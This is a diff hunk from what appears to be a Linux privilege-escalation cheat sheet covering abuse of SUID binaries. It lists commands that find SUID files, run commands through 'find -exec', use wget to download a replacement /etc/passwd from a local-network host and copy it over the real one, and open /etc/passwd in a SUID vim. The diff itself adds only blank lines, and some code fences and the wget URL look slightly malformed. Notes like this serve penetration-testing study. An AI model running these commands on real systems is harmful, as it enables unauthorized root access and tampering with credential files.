@@ -291,11 +291,13 @@ lsblk
 find / -perm -u=s -type f 2>/dev/null
 ```
 find with suid perm:
+
 touch raj
 find raj -exec "whoami" \;
 ```
 ```
 cp with suid perm:
+
 cd /tmp
 wget //192.168.1.108/passwd(get new /etc/passwd under /tmp)
 cp passwd /etc/passwd
@@ -306,6 +308,7 @@ ls -al /etc/cron.hourly/
 ```
 ```
 vim.basic with suid:
+
 vim.basic /etc/passwd
 ```
 
